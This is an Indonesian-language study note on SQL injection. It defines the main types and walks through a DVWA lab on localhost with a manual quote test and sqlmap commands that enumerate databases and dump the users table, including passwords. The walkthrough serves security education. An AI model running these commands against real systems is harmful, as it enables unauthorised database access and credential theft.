---
id: Memahami SQL Injection
aliases: []
tags:
  - sql
  - databases
  - web_security
  - owasp
comments: true
date: 2025-11-16
draft: false
---

---

Related: [[index|Home]], [[sql]], [[databases]], [[web_security]], [[owasp]]

---

## Cue

- Apa itu SQL Injection?
- Apa saja jenis-jenis SQL Injection?
- Bagaimana cara memeriksa kerentanan SQL Injection secara manual?
- Bagaimana cara menggunakan SQLMap untuk mengeksploitasi kerentanan SQL Injection, termasuk Blind SQL Injection?

---

## Notes

### Apa itu SQL Injection?
**SQL Injection** adalah teknik eksploitasi kerentanan keamanan pada aplikasi web yang memungkinkan penyerang menyisipkan (inject) kode SQL berbahaya ke dalam input yang diproses oleh aplikasi. Ini dapat menyebabkan penyerang memanipulasi kueri database, mengakses data sensitif, atau bahkan mengambil alih kontrol database.

### Jenis SQL Injection
1.  **Blind SQL Injection**:
    -   Terjadi ketika aplikasi rentan tetapi tidak menampilkan pesan error database secara langsung. Penyerang harus menyimpulkan informasi berdasarkan respons boolean (benar/salah) atau waktu respons (time-based).
2.  **Union-Based SQL Injection**:
    -   Memanfaatkan operator `UNION` untuk menggabungkan hasil kueri asli dengan kueri berbahaya penyerang, sehingga data dari tabel lain dapat diekstrak.
3.  **Error-Based SQL Injection**:
    -   Terjadi ketika aplikasi menampilkan pesan error database yang berisi informasi sensitif atau hasil dari kueri SQL yang disisipkan.

### Demo DVWA (Manual dan SQLMap)

#### 1. Cek Kerentanan Manual
- Tambahkan tanda kutip tunggal (`'`) pada parameter URL yang dicurigai rentan (misal: `id=3'`).
- Jika aplikasi menampilkan *syntax error* database atau tampilan UI rusak, ini adalah indikasi awal kerentanan SQL Injection.

#### 2. Menggunakan SQLMap untuk Eksploitasi
SQLMap adalah alat otomatis yang sangat efektif untuk mendeteksi dan mengeksploitasi SQL Injection.

- **Mendapatkan Informasi Database**:
  ```bash
  sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=..." --dbs
  ```
  Perintah ini akan mencoba mengidentifikasi database yang tersedia (misal: `dvwa`, `information_schema`).

- **Melihat Tabel dalam Database**:
  ```bash
  sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=..." -D dvwa --tables
  ```
  Ini akan menampilkan tabel-tabel dalam database `dvwa` (misal: `guestbook`, `users`).

- **Melihat Kolom dalam Tabel**:
  ```bash
  sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=..." -D dvwa -T users --columns
  ```
  Ini akan menampilkan kolom-kolom dalam tabel `users`.

- **Mengekstrak Data (Dump)**:
  ```bash
  sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=..." -D dvwa -T users --dump
  ```
  Perintah ini akan mengekstrak semua data dari tabel `users`, termasuk username dan password (yang mungkin di-crack oleh SQLMap).

### Blind SQL Injection
- Dalam Blind SQL Injection, aplikasi tidak menampilkan error secara langsung. SQLMap dapat mendeteksi ini menggunakan teknik *boolean-based blind* atau *time-based blind*.
- **Contoh SQLMap untuk Blind SQLi**:
  ```bash
  sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli_blind/" --data="id=1&Submit=submit" --cookie="PHPSESSID=..." --dbs
  ```
  SQLMap akan secara otomatis mengidentifikasi teknik injeksi yang sesuai dan mencoba mengekstrak informasi.

---

## Summary

SQL Injection adalah kerentanan kritis yang memungkinkan penyerang menyisipkan kode SQL berbahaya untuk memanipulasi database. Jenis-jenisnya meliputi Blind, Union-Based, dan Error-Based SQL Injection. Alat otomatis seperti SQLMap sangat efektif untuk mendeteksi dan mengeksploitasi kerentanan ini, bahkan dalam skenario Blind SQL Injection, dengan kemampuan untuk mengekstrak informasi database secara sistematis.